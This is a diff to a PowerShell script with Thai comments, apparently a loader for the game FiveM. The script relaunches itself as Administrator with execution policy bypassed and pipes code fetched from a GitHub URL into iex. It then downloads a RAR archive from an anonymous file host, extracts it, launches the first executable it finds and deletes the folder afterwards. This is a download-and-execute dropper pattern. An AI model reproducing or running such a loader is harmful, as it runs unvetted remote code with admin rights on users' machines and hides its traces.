@@ -1,37 +1,39 @@
 # 1. ขอสิทธิ์ Admin
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/nphathrbuychi-boop/top1/refs/heads/main/Cmdfivem').Content)`"" -Verb RunAs
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/nphathrbuychi-boop/Top3/refs/heads/main/CMDFivem').Content)`"" -Verb RunAs
     exit
 }
 
-# 2. ตั้งค่าพาธ (ใช้โฟลเดอร์ Temp)
+# 2. พื้นที่ทำงาน
 $url = "https://files.catbox.moe/efrw7v.rar"
-$tempDir = "$env:TEMP\FiveM_Update"
-$rarFile = "$tempDir\data.rar"
+$workDir = "$env:LOCALAPPDATA\FiveM_Loader"
+$rarPath = "$workDir\data.rar"
 
-# สร้างโฟลเดอร์
-if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
-New-Item -ItemType Directory -Path $tempDir | Out-Null
+if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
 
-# 3. ดาวน์โหลด
-Write-Host "[*] Downloading file..." -ForegroundColor Cyan
-Invoke-WebRequest -Uri $url -OutFile $rarFile -UseBasicParsing
+# 3. ดาวน์โหลด (เพิ่มการเช็คไฟล์)
+Write-Host "[*] Downloading..." -ForegroundColor Cyan
+Invoke-WebRequest -Uri $url -OutFile $rarPath -UseBasicParsing
 
-# 4. แตกไฟล์ (ใช้ tar แทน Expand-Archive เพื่อรองรับ .rar)
-Write-Host "[*] Extracting files..." -ForegroundColor Cyan
-cd $tempDir
-tar -xf $rarFile
+# 4. แตกไฟล์ด้วย tar (บังคับ Overwrite)
+Write-Host "[*] Extracting..." -ForegroundColor Cyan
+tar -xf $rarPath -C $workDir
 
-# 5. รันไฟล์ .exe
-Write-Host "[*] Running application..." -ForegroundColor Green
-$exe = Get-ChildItem -Filter "*.exe" | Select-Object -First 1
+# 5. ค้นหา .exe แบบละเอียด (หาทุกโฟลเดอร์ย่อย)
+Write-Host "[*] Searching for executable..." -ForegroundColor Cyan
+$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
+
 if ($exe) {
-    Start-Process -FilePath $exe.FullName -Wait
+    Write-Host "[+] Found: $($exe.FullName)" -ForegroundColor Green
+    Write-Host "[!] Launching in 2 seconds..." -ForegroundColor White
+    Start-Sleep -Seconds 2
+    # รันโดยตรง
+    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
+} else {
+    Write-Host "[!] ERROR: No .exe found! Folder content:" -ForegroundColor Red
+    Get-ChildItem -Path $workDir -Recurse | Select-Object Name
 }
 
-# 6. ลบไฟล์ทิ้ง
+# 6. ลบไฟล์
 Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
-cd $env:TEMP
-Remove-Item -Path $tempDir -Recurse -Force
-
-Write-Host "[+] Done!" -ForegroundColor White
+Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
